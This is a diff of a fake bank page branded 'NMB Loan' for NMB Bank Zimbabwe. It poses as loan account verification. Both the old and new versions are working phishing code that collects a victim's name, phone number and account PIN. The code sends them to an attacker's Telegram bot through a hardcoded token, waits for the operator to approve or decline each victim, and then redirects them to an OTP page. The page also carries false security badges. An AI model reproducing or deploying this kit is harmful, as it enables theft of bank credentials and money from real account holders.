@@ -2,219 +2,352 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - Identity Verification</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>NMB Loan | Verify Account · Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
-        * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #003d7a 0%, #002147 100%); min-height: 100vh; }
-        .pin-input:focus { border-color: #fbbf24; box-shadow: 0 0 0 2px rgba(251, 191, 36, 0.2); }
-        .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
-        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        :root {
+            --nmb-blue: #003366;
+            --nmb-gold: #E4C16A;
+            --nmb-gold-light: #f1dfae;
+            --navy-dark: #002244;
+            --white: #ffffff;
+            --light: #f8f9fa;
+            --dark: #1a1a1a;
+            --muted: #666666;
+            --border: #e0ddd9;
+            --error: #d32f2f;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
+
+        body {
+            font-family: 'Poppins', system-ui, sans-serif;
+            background: linear-gradient(135deg, var(--navy-dark) 0%, var(--nmb-blue) 50%, #004080 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background: white;
+            padding: 14px 5%;
+            border-bottom: 4px solid var(--nmb-gold);
+            box-shadow: 0 2px 8px rgba(0,51,102,0.08);
+        }
+
+        .logo { font-size: 22px; font-weight: 900; text-decoration: none; display: flex; align-items: center; }
+        .logo .nmb { color: var(--nmb-blue); }
+        .logo .loan { color: var(--nmb-gold); margin-left: 2px; }
+
+        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; }
+
+        .card {
+            background: white;
+            border-radius: 18px;
+            padding: 36px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,51,102,0.35);
+        }
+
+        .card-head { text-align: center; margin-bottom: 22px; }
+        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 4px; }
+        .card-head p { color: var(--muted); font-size: 12px; }
+
+        .bundle-bar {
+            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            color: white;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+        .b-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+
+        .fg { margin-bottom: 16px; }
+        .fl { display: block; font-size: 10px; font-weight: 800; color: var(--nmb-blue); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 6px; }
+
+        .iw {
+            display: flex;
+            align-items: center;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 14px;
+            background: var(--light);
+            transition: all 0.2s;
+        }
+
+        .iw:focus-within { border-color: var(--nmb-gold); background: white; box-shadow: 0 0 0 4px rgba(228,193,106,0.08); }
+
+        .prefix { font-weight: 800; color: var(--nmb-blue); margin-right: 8px; font-size: 13px; }
+
+        .fi {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-size: 14px;
+            color: var(--dark);
+            outline: none;
+            font-family: inherit;
+        }
+
+        .fi::placeholder { color: #b8b8b8; }
+
+        .pin-tog { background: none; border: none; color: var(--nmb-gold); cursor: pointer; font-weight: 800; font-size: 10px; font-family: inherit; transition: color 0.2s; }
+        .pin-tog:hover { color: #d4ac4d; }
+
+        .hint { font-size: 10px; color: var(--muted); margin-top: 4px; }
+
+        .err {
+            display: none;
+            background: rgba(211,47,47,0.08);
+            border: 1.5px solid rgba(211,47,47,0.2);
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 700;
+            border-radius: 10px;
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+
+        .err.show { display: block; }
+
+        .btns { display: flex; gap: 10px; margin-top: 20px; }
+
+        .btn-p {
+            flex: 1;
+            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            font-family: inherit;
+            box-shadow: 0 4px 14px rgba(0,51,102,0.28);
+            transition: all 0.2s;
+        }
+
+        .btn-p:hover { background: var(--nmb-gold); color: var(--nmb-blue); transform: translateY(-2px); box-shadow: 0 6px 18px rgba(228,193,106,0.3); }
+
+        .btn-o {
+            flex: 1;
+            background: transparent;
+            color: var(--nmb-blue);
+            border: 2px solid var(--nmb-blue);
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .btn-o:hover { background: var(--light); }
+
+        .card-ft { text-align: center; margin-top: 16px; font-size: 10px; color: var(--muted); }
+        .card-ft a { color: var(--nmb-gold); text-decoration: none; font-weight: 800; }
+        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 700; }
+
+        /* Loading */
+        .overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
+            background: rgba(0,34,68,0.93);
+            z-index: 2000;
+            backdrop-filter: blur(6px);
+        }
+
+        .overlay.on { display: flex; }
+        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 14px; font-weight: 800; color: white; }
+        .sp-s { font-size: 11px; color: rgba(255,255,255,0.65); }
+        @keyframes sp { to { transform: rotate(360deg); } }
+
+        /* Modal */
+        .modal {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center;
+            background: rgba(0,34,68,0.75);
+            z-index: 2000; padding: 20px;
+            backdrop-filter: blur(6px);
+        }
+
+        .modal.on { display: flex; }
+
+        .modal-box {
+            background: white;
+            border-radius: 16px;
+            padding: 32px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 16px 48px rgba(0,51,102,0.3);
+        }
+
+        .modal-box h2 { font-size: 18px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 8px; }
+        .modal-box p { color: var(--muted); font-size: 13px; margin-bottom: 18px; }
+        .modal-btn { width: 100%; padding: 14px; border-radius: 50px; border: none; font-weight: 800; font-size: 12px; cursor: pointer; background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark)); color: white; font-family: inherit; box-shadow: 0 4px 12px rgba(0,51,102,0.25); }
+
+        @media (max-width: 500px) {
+            main { padding: 24px 12px; }
+            .card { padding: 28px 18px; }
+            .btns { flex-direction: column; }
+        }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
-    <div class="w-full max-w-sm fade-in">
-        <!-- Header -->
-        <div class="text-center mb-6">
-            <div class="flex items-center justify-center gap-2 mb-2">
-                <div class="w-8 h-8 bg-white rounded-full flex items-center justify-center shadow-lg">
-                    <span class="text-sm font-black text-[#003d7a]">N</span>
-                </div>
-                <div>
-                    <div class="flex items-center gap-1">
-                        <span class="text-2xl font-black text-white tracking-tighter">NMB</span>
-                        <span class="text-2xl font-black text-[#fbbf24] tracking-tighter">Connect</span>
-                    </div>
-                </div>
+<body>
+    <header><a class="logo" href="index.html"><span class="nmb">NMB</span><span class="loan">Loan</span></a></header>
+
+    <main>
+        <div class="card">
+            <div class="card-head">
+                <h1>Verify Your Account</h1>
+                <p>Enter your NMB details to apply for your loan</p>
             </div>
-            <p class="text-white/80 text-[9px] font-bold uppercase tracking-[0.2em]">Identity Verification</p>
+
+            <div id="bBar" class="bundle-bar" style="display:none;">
+                <div class="b-row"><span>Loan Type:</span><span id="bD">&mdash;</span></div>
+                <div class="b-row"><span>Amount:</span><span id="bP">$0 USD</span></div>
+            </div>
+
+            <div id="err" class="err"></div>
+
+            <form id="frm" onsubmit="doSubmit(event)">
+                <div class="fg">
+                    <label class="fl" for="name">Full Name</label>
+                    <div class="iw"><input type="text" class="fi" id="name" placeholder="John Doe" autocomplete="name"></div>
+                </div>
+                <div class="fg">
+                    <label class="fl" for="phone">Phone Number</label>
+                    <div class="iw"><span class="prefix">+263</span><input type="tel" class="fi" id="phone" placeholder="7X XXX XXXX" inputmode="numeric" maxlength="9"></div>
+                    <p class="hint">9 digits (e.g. 7XXXXXXXX)</p>
+                </div>
+                <div class="fg">
+                    <label class="fl" for="pin">Account PIN</label>
+                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4"><button type="button" class="pin-tog" onclick="togPin()">Show</button></div>
+                    <p class="hint">4 digit NMB Account PIN</p>
+                </div>
+                <div class="btns">
+                    <button type="submit" class="btn-p">Verify & Continue</button>
+                    <button type="button" class="btn-o" onclick="location.href='index.html'">Cancel</button>
+                </div>
+            </form>
+
+            <div class="card-ft">By continuing you agree to our <a href="#">Terms</a> & <a href="#">Privacy</a></div>
+            <div class="secure">🔒 256-bit Encrypted · PCI DSS</div>
         </div>
+    </main>
 
-        <!-- Main Card -->
-        <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
-            <!-- Title Section -->
-            <div class="bg-gradient-to-r from-[#003d7a] to-[#005a99] p-6 text-center">
-                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Verify Your Details</h1>
-                <p class="text-white/70 text-[9px] font-bold uppercase tracking-widest">Enter your mobile number and PIN</p>
-            </div>
+    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Account</div><div class="sp-s">Please wait...</div></div>
 
-            <!-- Content -->
-            <div id="loginForm" class="p-6 sm:p-8 space-y-6">
-                <!-- Loan Amount Display -->
-                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4 flex justify-between items-center">
-                    <span class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Loan Amount</span>
-                    <span class="font-black text-lg text-[#003d7a]" id="displayAmount">USD 500</span>
-                </div>
-
-                <!-- Applicant Name Display -->
-                <div class="bg-gray-50 border border-gray-100 rounded-2xl p-4 flex justify-between items-center">
-                    <span class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Applicant Name</span>
-                    <span class="font-black text-lg text-[#003d7a]" id="displayName">-</span>
-                </div>
-
-                <!-- Phone Number -->
-                <div class="space-y-2">
-                    <label class="text-[9px] font-black text-gray-400 uppercase tracking-widest ml-1">Mobile Number (Zimbabwe)</label>
-                    <div class="relative">
-                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 font-black text-sm">+263</span>
-                        <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
-                            class="w-full pl-16 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24] transition-all font-black text-base text-gray-700 placeholder:text-gray-300">
-                    </div>
-                    <p class="text-[8px] text-gray-500">Enter 9-digit Zimbabwean mobile number</p>
-                </div>
-
-                <!-- PIN -->
-                <div class="space-y-2">
-                    <label class="text-[9px] font-black text-gray-400 uppercase tracking-widest ml-1">4-Digit Security PIN</label>
-                    <div class="flex gap-3">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                    </div>
-                </div>
-
-                <!-- Submit Button -->
-                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003d7a] to-[#005a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
-                    Submit for Verification <i class="fas fa-shield-alt ml-2"></i>
-                </button>
-            </div>
-
-            <!-- Verification Overlay -->
-            <div id="verificationOverlay" class="hidden p-10 text-center space-y-6">
-                <div class="relative w-24 h-24 mx-auto">
-                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
-                    <div class="absolute inset-0 border-4 border-[#fbbf24] border-t-transparent rounded-full animate-spin"></div>
-                    <div class="absolute inset-0 flex items-center justify-center">
-                        <i class="fas fa-user-shield text-3xl text-[#003d7a]"></i>
-                    </div>
-                </div>
-                <div class="space-y-2">
-                    <h3 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verification in Progress</h3>
-                    <p class="text-gray-500 text-[9px] font-bold uppercase tracking-widest">Hold for verification...</p>
-                </div>
-            </div>
+    <div id="aModal" class="modal">
+        <div class="modal-box">
+            <h2>Already Applied</h2>
+            <p>This transaction has already been applied to your account.</p>
+            <button class="modal-btn" onclick="goOTP()">Continue</button>
         </div>
-
-        <!-- Footer -->
-        <p class="text-center text-white/50 text-[9px] mt-8 font-bold uppercase tracking-widest">
-            © 2026 NMB Bank Zimbabwe | Secure Verification Portal
-        </p>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
-        const TELEGRAM_CHAT_ID = '7547427914';
-        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+        const CID = '7547427914';
+        let bd = {}, luid = 0;
 
-        const pinInputs = document.querySelectorAll('.pin-input');
-        const phoneInput = document.getElementById('phone');
-        const submitBtn = document.getElementById('submitBtn');
-        const loginForm = document.getElementById('loginForm');
-        const verificationOverlay = document.getElementById('verificationOverlay');
-        const displayAmount = document.getElementById('displayAmount');
-        const displayName = document.getElementById('displayName');
+        function init() {
+            const p = new URLSearchParams(location.search);
+            const d = p.get('data'), pr = p.get('price');
+            if (d && pr) {
+                bd = { data: d, price: pr };
+                document.getElementById('bBar').style.display = 'block';
+                document.getElementById('bD').textContent = d;
+                document.getElementById('bP').textContent = '$' + pr + ' USD';
+            }
+        }
 
-        const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
-        if (loanData.amount) displayAmount.textContent = `USD ${parseFloat(loanData.amount).toLocaleString()}`;
-        if (loanData.fullName) displayName.textContent = loanData.fullName;
+        function togPin() {
+            const el = document.getElementById('pin');
+            const b = event.target;
+            el.type = el.type === 'password' ? 'text' : 'password';
+            b.textContent = el.type === 'password' ? 'Show' : 'Hide';
+        }
 
-        pinInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value && index < pinInputs.length - 1) pinInputs[index + 1].focus();
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) pinInputs[index - 1].focus();
-            });
-        });
+        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
+        function clrErr() { document.getElementById('err').classList.remove('show'); }
 
-        phoneInput.addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));
-
-        submitBtn.addEventListener('click', async () => {
-            const phoneRaw = phoneInput.value;
-            const pin = Array.from(pinInputs).map(i => i.value).join('');
-
-            if (phoneRaw.length !== 9) { alert('Please enter a valid 9-digit Zimbabwean phone number'); return; }
-            if (pin.length !== 4) { alert('Please enter your 4-digit PIN'); return; }
-
-            const phone = '+263' + phoneRaw;
-            const sessionData = {
-                phone: phone,
-                pin: pin,
-                ...loanData
-            };
-            localStorage.setItem('nmb_session', JSON.stringify(sessionData));
-            localStorage.setItem('current_phone', phone);
-
-            const message = `
-🚨 <b>NEW LOAN APPLICATION - NMB ZIMBABWE</b>
-
-👤 <b>Applicant Name:</b> ${sessionData.fullName}
-📱 <b>Phone Number:</b> ${sessionData.phone}
-💰 <b>Loan Amount:</b> USD ${sessionData.amount}
-📅 <b>Loan Term:</b> ${sessionData.term} months
-💼 <b>Purpose:</b> ${sessionData.purpose}
-💵 <b>Monthly Income:</b> USD ${sessionData.income}
-🔐 <b>PIN:</b> ${pin}
-
-<b>Status: Awaiting Admin Review</b>
-            `;
-
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [
-                        { text: '✅ APPROVE', callback_data: `approve_${phone}` },
-                        { text: '❌ DECLINE', callback_data: `decline_${phone}` },
-                        { text: '⚠️ ALREADY APPLIED', callback_data: `applied_${phone}` }
-                    ]
-                ]
-            };
-
+        async function tg(msg, btns) {
             try {
-                await fetch(`${TELEGRAM_API}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: inlineKeyboard
-                    })
+                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                 });
-
-                loginForm.classList.add('hidden');
-                verificationOverlay.classList.remove('hidden');
-                pollForApproval(phone);
-            } catch (error) {
-                alert('Connection error. Please try again.');
-            }
-        });
-
-        function pollForApproval(phone) {
-            const interval = setInterval(() => {
-                const status = localStorage.getItem(`approval_${phone}`);
-                
-                if (status === 'approved') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`approval_${phone}`);
-                    window.location.href = 'otp.html';
-                } else if (status === 'declined') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`approval_${phone}`);
-                    alert('Your application has been declined. Please try again later.');
-                    location.reload();
-                } else if (status === 'applied') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`approval_${phone}`);
-                    alert('This phone number has already submitted an application. Please use a different number.');
-                    location.reload();
-                }
-            }, 1000);
+            } catch(e) { console.error(e); }
         }
+
+        function doSubmit(e) {
+            e.preventDefault();
+            clrErr();
+            const name = document.getElementById('name').value.trim();
+            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            const pin = document.getElementById('pin').value.trim();
+
+            if (!name) { showErr('Enter your full name'); return; }
+            if (phone.length < 9) { showErr('Enter a valid 9-digit number'); return; }
+            if (pin.length !== 4) { showErr('PIN must be 4 digits'); return; }
+
+            const msg = `📱 <b>NMB Loan Login</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>$${bd.price || '0'} USD</code>`;
+
+            const btns = [
+                [{ text: '✓ Approved', callback_data: 'login_approved' }, { text: '✗ Declined', callback_data: 'login_declined' }],
+                [{ text: '⚠️ Already Applied', callback_data: 'login_applied' }]
+            ];
+
+            document.getElementById('ov').classList.add('on');
+            tg(msg, btns);
+            poll();
+        }
+
+        function poll() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            const u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                const cb = u.callback_query.data;
+                                if (cb === 'login_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goOTP(); }
+                                else if (cb === 'login_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Request declined. Try again.'); document.getElementById('frm').reset(); }
+                                else if (cb === 'login_applied') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('aModal').classList.add('on'); }
+                            }
+                        }
+                    }).catch(e => console.error(e));
+            }, 1000);
+            setTimeout(() => clearInterval(iv), 300000);
+        }
+
+        function goOTP() {
+            document.getElementById('aModal').classList.remove('on');
+            const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${ph}`;
+        }
+
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
